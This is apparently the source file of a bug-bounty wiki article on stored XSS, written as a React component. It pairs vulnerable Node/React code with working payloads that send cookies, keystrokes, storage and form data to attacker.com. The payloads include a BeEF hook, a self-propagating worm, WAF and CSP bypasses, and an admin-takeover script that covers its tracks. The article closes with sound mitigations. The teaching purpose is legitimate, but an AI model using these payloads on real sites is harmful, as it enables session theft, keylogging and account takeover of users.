/**
 * XSS STORED
 * Persistent Cross-Site Scripting in database (English version)
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Code2, AlertTriangle, Shield, Database, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function XSSStoredContentEN({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduction" title="Stored XSS - The Most Dangerous">
        <Paragraph>
          <Strong>Stored XSS (Persistent XSS)</Strong> occurs when malicious input is saved in the 
          database and executes every time someone accesses the page. Unlike reflected XSS, 
          this <Strong>does NOT require the victim to click a link</Strong>.
        </Paragraph>

        <AlertDanger title="Critical Impact">
          <ul className="mt-2 space-y-1">
            <ListItem>🎯 Affects ALL users who view the content</ListItem>
            <ListItem>🔐 Mass session cookie theft</ListItem>
            <ListItem>👤 Permanent site defacement</ListItem>
            <ListItem>🎣 Persistent keylogger installation</ListItem>
            <ListItem>💉 Self-propagating XSS worms</ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="vulnerable-example" title="1. Classic Vulnerable Code">
        <Subsection title="Backend Without Sanitization">
          <CodeBlock
            language="javascript"
            title="Node.js - Save comment without validation"
            code={`app.post('/api/comments', async (req, res) => {
  const { postId, userId, comment } = req.body;
  
  // ❌ VULNERABLE - Save direct input without sanitizing
  await db.comments.create({
    post_id: postId,
    user_id: userId,
    content: comment,  // ← No validation or escaping
    created_at: new Date()
  });
  
  res.json({ success: true });
});`}
          />
        </Subsection>

        <Subsection title="Frontend Renders Without Escaping">
          <CodeBlock
            language="jsx"
            title="React - Vulnerable code"
            code={`function CommentsList({ comments }) {
  return (
    <div>
      {comments.map(comment => (
        <div key={comment.id}>
          <p className="author">{comment.username}</p>
          {/* ❌ VULNERABLE - dangerouslySetInnerHTML without sanitizing */}
          <div dangerouslySetInnerHTML={{ __html: comment.content }} />
        </div>
      ))}
    </div>
  );
}`}
          />
        </Subsection>

        <Subsection title="Basic Payload">
          <CodeBlock
            language="html"
            title="Malicious comment"
            code={`<script>
  // Steal session cookie
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

<p>Great article! 👍</p>`}
          />

          <AlertWarning>
            When any user views this page, their cookie will be sent to the attacker.
          </AlertWarning>
        </Subsection>
      </Section>

      <Section id="advanced-payloads" title="2. Advanced Payloads">
        <Subsection title="Persistent Keylogger">
          <CodeBlock
            language="html"
            title="Payload - Capture EVERYTHING they type"
            code={`<script>
document.addEventListener('keypress', function(e) {
  fetch('https://attacker.com/log', {
    method: 'POST',
    body: JSON.stringify({
      key: e.key,
      page: window.location.href,
      timestamp: new Date()
    })
  });
});
</script>

<p>Interesting point of view</p>`}
          />
        </Subsection>

        <Subsection title="Cookie Stealer with HttpOnly Bypass">
          <CodeBlock
            language="html"
            title="Payload - Steal data even when HttpOnly is active"
            code={`<script>
// HttpOnly prevents access to document.cookie, but not to localStorage/sessionStorage
const data = {
  url: window.location.href,
  localStorage: JSON.stringify(localStorage),
  sessionStorage: JSON.stringify(sessionStorage),
  // Capture CSRF token from DOM
  csrfToken: document.querySelector('[name="csrf-token"]')?.content,
  // Capture form data
  forms: Array.from(document.forms).map(f => ({
    action: f.action,
    inputs: Array.from(f.elements).map(e => ({
      name: e.name,
      value: e.value
    }))
  }))
};

fetch('https://attacker.com/exfil', {
  method: 'POST',
  body: JSON.stringify(data)
});
</script>`}
          />
        </Subsection>

        <Subsection title="BeEF Hook - Total Browser Control">
          <CodeBlock
            language="html"
            title="Payload - Connect to BeEF Framework"
            code={`<script src="https://attacker.com/hook.js"></script>

<!-- When victim loads the page, their browser connects
     to attacker's BeEF control panel, allowing:
     - Execute arbitrary JavaScript commands
     - Capture screenshots
     - Activate webcam/microphone (with permissions)
     - Redirect to phishing
     - Scan internal network
-->`}
          />
        </Subsection>

        <Subsection title="Self-Propagating XSS Worm">
          <CodeBlock
            language="html"
            title="Payload - Samy-style worm (MySpace 2005)"
            code={`<script>
async function propagate() {
  // Get friend/follower list
  const response = await fetch('/api/friends');
  const friends = await response.json();
  
  // Malicious message
  const payload = \`
    <script src="https://attacker.com/worm.js"><\\/script>
    <p>Check this out! 🔥</p>
  \`;
  
  // Send message to all friends
  for (const friend of friends) {
    await fetch('/api/messages', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        to: friend.id,
        message: payload
      })
    });
  }
}

propagate();
</script>`}
          />

          <AlertDanger>
            This type of worm self-propagates to ALL contacts of each victim, 
            causing mass infection in minutes.
          </AlertDanger>
        </Subsection>
      </Section>

      <Section id="bypass-filters" title="3. WAF Filter Bypass">
        <Subsection title="Bypass <script> Blacklist">
          <CodeBlock
            language="html"
            title="Alternative techniques without <script>"
            code={`<!-- Event handlers -->
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">

<!-- SVG with JavaScript -->
<svg onload="alert(document.domain)">

<!-- iframe srcdoc -->
<iframe srcdoc="<script>alert(1)<\/script>">

<!-- HTML5 autofocus -->
<input autofocus onfocus="fetch('https://attacker.com/?c='+document.cookie)">

<!-- Base64 encoding -->
<img src=x onerror="eval(atob('ZmV0Y2goJ2h0dHBzOi8vYXR0YWNrZXIuY29tLz9jPScrZG9jdW1lbnQuY29va2llKQ=='))">

<!-- Unicode bypass -->
<img src=x onerror="\\u0066\\u0065\\u0074\\u0063\\u0068('https://attacker.com')">

<!-- HTML entities -->
<img src=x onerror="&#102;&#101;&#116;&#99;&#104;('https://attacker.com')">`}
          />
        </Subsection>

        <Subsection title="CSP (Content Security Policy) Bypass">
          <CodeBlock
            language="html"
            title="Exploit misconfigured CSP"
            code={`<!-- If CSP allows 'unsafe-inline' -->
<img src=x onerror="alert(1)">

<!-- If CSP allows a specific CDN -->
<script src="https://allowed-cdn.com/jquery.js"></script>
<script>
  // jQuery already loaded, abuse it
  $.getScript('https://attacker.com/evil.js');
</script>

<!-- If CSP allows data: URIs -->
<script src="data:text/javascript,fetch('https://attacker.com/?c='+document.cookie)"></script>

<!-- JSONP endpoint abuse -->
<!-- If CSP allows https://api.example.com -->
<script src="https://api.example.com/jsonp?callback=fetch('https://attacker.com')//"></script>`}
          />
        </Subsection>
      </Section>

      <Section id="real-exploitation" title="4. Real Case: Admin Panel Takeover">
        <Subsection title="Scenario">
          <Paragraph>
            A support ticket application allows users to attach "notes" that 
            administrators see when reviewing tickets.
          </Paragraph>
        </Subsection>

        <Subsection title="Step 1: Create Ticket with Payload">
          <CodeBlock
            language="json"
            title="POST /api/tickets"
            code={`{
  "subject": "Problem with my account",
  "description": "Can't access",
  "internal_note": "<script src='https://attacker.com/admin-pwn.js'></script>"
}`}
          />
        </Subsection>

        <Subsection title="Step 2: Malicious Script (admin-pwn.js)">
          <CodeBlock
            language="javascript"
            title="admin-pwn.js - Create admin account"
            code={`(async function() {
  // Verify we're in admin panel
  if (!window.location.pathname.includes('/admin')) {
    return;
  }
  
  // Create attacker account as admin
  await fetch('/admin/api/users', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': document.querySelector('[name=csrf-token]').content
    },
    body: JSON.stringify({
      username: 'hacker',
      password: 'pwned123!',
      email: 'hacker@evil.com',
      role: 'admin'
    })
  });
  
  // Exfiltrate all users list
  const users = await fetch('/admin/api/users').then(r => r.json());
  
  await fetch('https://attacker.com/loot', {
    method: 'POST',
    body: JSON.stringify(users)
  });
  
  // Cover tracks: delete the ticket
  await fetch(\`/admin/api/tickets/\${getTicketId()}\`, {
    method: 'DELETE'
  });
})();`}
          />

          <AlertWarning>
            When admin opens the ticket, the script executes with their permissions, 
            creating an admin account for the attacker.
          </AlertWarning>
        </Subsection>
      </Section>

      <Section id="mitigation" title="Complete Mitigation">
        <AlertDanger title="✅ Defense in Depth">
          Implement ALL these security layers:
        </AlertDanger>

        <Subsection title="1. Backend Sanitization">
          <CodeBlock
            language="javascript"
            title="✅ SECURE - DOMPurify in Node.js"
            code={`const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

app.post('/api/comments', async (req, res) => {
  const { postId, userId, comment } = req.body;
  
  // ✅ SECURE - Sanitize HTML
  const sanitizedComment = DOMPurify.sanitize(comment, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'li'],
    ALLOWED_ATTR: ['href'],
    ALLOW_DATA_ATTR: false
  });
  
  await db.comments.create({
    post_id: postId,
    user_id: userId,
    content: sanitizedComment,
    created_at: new Date()
  });
  
  res.json({ success: true });
});`}
          />
        </Subsection>

        <Subsection title="2. Frontend Escaping (React)">
          <CodeBlock
            language="jsx"
            title="✅ SECURE - Use textContent instead of innerHTML"
            code={`import DOMPurify from 'isomorphic-dompurify';

function CommentsList({ comments }) {
  return (
    <div>
      {comments.map(comment => (
        <div key={comment.id}>
          <p className="author">{comment.username}</p>
          
          {/* ✅ SECURE - Sanitize before rendering */}
          <div 
            dangerouslySetInnerHTML={{ 
              __html: DOMPurify.sanitize(comment.content, {
                ALLOWED_TAGS: ['p', 'b', 'i', 'a'],
                ALLOWED_ATTR: ['href']
              })
            }} 
          />
        </div>
      ))}
    </div>
  );
}

// ✅ Even safer: Plain text only
function SafeComment({ content }) {
  return <p>{content}</p>;  // React escapes automatically
}`}
          />
        </Subsection>

        <Subsection title="3. Strict Content Security Policy">
          <CodeBlock
            language="javascript"
            title="✅ SECURE - Robust CSP header"
            code={`const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: [
      "'self'",
      // DO NOT use 'unsafe-inline' or 'unsafe-eval'
    ],
    styleSrc: ["'self'", "'unsafe-inline'"],  // Styles are less dangerous
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'"],
    fontSrc: ["'self'"],
    objectSrc: ["'none'"],
    mediaSrc: ["'self'"],
    frameSrc: ["'none'"],
    baseUri: ["'self'"],
    formAction: ["'self'"],
    upgradeInsecureRequests: []
  }
}));`}
          />
        </Subsection>

        <Subsection title="4. HttpOnly + Secure Cookies">
          <CodeBlock
            language="javascript"
            title="✅ SECURE - Cookies inaccessible from JavaScript"
            code={`app.use(session({
  secret: process.env.SESSION_SECRET,
  cookie: {
    httpOnly: true,   // ✅ Not accessible from JavaScript
    secure: true,     // ✅ HTTPS only
    sameSite: 'strict' // ✅ Prevent CSRF
  }
}));`}
          />
        </Subsection>

        <Subsection title="5. Input Validation with Schema">
          <CodeBlock
            language="javascript"
            title="✅ SECURE - Joi validation"
            code={`const Joi = require('joi');

const commentSchema = Joi.object({
  postId: Joi.number().required(),
  userId: Joi.number().required(),
  comment: Joi.string()
    .max(500)
    .pattern(/^[a-zA-Z0-9\\s.,!?áéíóúñÑ]+$/)  // Safe text only
    .required()
});

app.post('/api/comments', async (req, res) => {
  // ✅ Validate structure
  const { error, value } = commentSchema.validate(req.body);
  
  if (error) {
    return res.status(400).json({ error: error.details[0].message });
  }
  
  // ... save comment
});`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Next: DOM-Based XSS</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/xss-dom-based`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>XSS based on DOM manipulation</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
